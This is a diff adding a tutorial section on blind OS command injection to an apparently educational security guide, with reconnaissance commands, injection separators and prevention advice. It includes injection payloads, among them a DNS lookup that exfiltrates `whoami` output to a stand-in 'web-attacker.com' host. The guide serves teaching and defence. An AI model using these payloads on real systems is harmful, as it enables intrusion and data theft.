@@ -59,6 +59,68 @@ I've got some handy payloads for both Linux and Windows in the tables below.
 | ping    | Make the app hang. Useful for testing blind command injection. |
 | timeout | Another app-freezing command. Handy for blind command injection tests if ping isn't around. |
 
+| Purpose of command      | Linux            | Windows           |
+|-------------------------|------------------|-------------------|
+| Name of current user    | whoami           | whoami            |
+| Operating system        | uname -a          | ver               |
+| Network configuration    | ifconfig         | ipconfig /all     |
+| Network connections     | netstat -an      | netstat -an       |
+| Running processes        | ps -ef           | tasklist          |
+
+## Blind OS Command Injection on Vulnerable Websites
+
+### Overview
+
+Many instances of OS command injection are blind vulnerabilities, meaning that the application doesn't display the command output in its HTTP responses. Despite this, blind vulnerabilities can still be exploited using various techniques.
+
+### Example Scenario
+
+Consider a website where users can submit feedback. The server-side application generates an email to an administrator using a command like:
+
+```bash
+mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
+```
+
+Since the command output isn't in the application's responses, traditional echo payloads won't work. Alternative techniques are needed.
+
+### Techniques for Detection and Exploitation
+
+1. **Detecting with Time Delays:**
+   - Use time delays triggered by an injected command.
+   - Example: `& ping -c 10 127.0.0.1 &`
+
+2. **Redirecting Output:**
+   - Redirect command output to a retrievable file in the web root.
+   - Example: `& whoami > /var/www/static/whoami.txt &`
+
+3. **Out-of-Band (OAST) Interaction:**
+   - Trigger an out-of-band network interaction.
+   - Example: `& nslookup kgji2ohoyw.web-attacker.com &`
+
+4. **Out-of-Band Data Exfiltration:**
+   - Use DNS lookups to exfiltrate command output.
+   - Example: `& nslookup \`whoami\`.kgji2ohoyw.web-attacker.com &`
+
+### Injection Techniques
+
+Use various shell metacharacters for OS command injection:
+
+- Command separators (work on both systems): `&`, `&&`, `|`, `||`
+- Unix-only separators: `;`, Newline (`\n`)
+- Inline execution (Unix-only): `` `injected command` ``, `$(injected command)`
+
+Considerations for special characters within quoted contexts in original commands.
+
+### Prevention Measures
+
+The most effective prevention is to avoid calling OS commands from application-layer code. If unavoidable:
+
+- Perform strong input validation.
+- Examples: Whitelisting permitted values, validating as a number, allowing only alphanumeric characters.
+- Never attempt to sanitize input by escaping shell metacharacters; it's error-prone and easily bypassed.
+
+**Note:** The provided examples and techniques are for educational purposes. Always adhere to ethical hacking practices and obtain proper authorization before testing on any system.
+
 ### Preventing Command Injection
 
 #### Vulnerable Functions in PHP
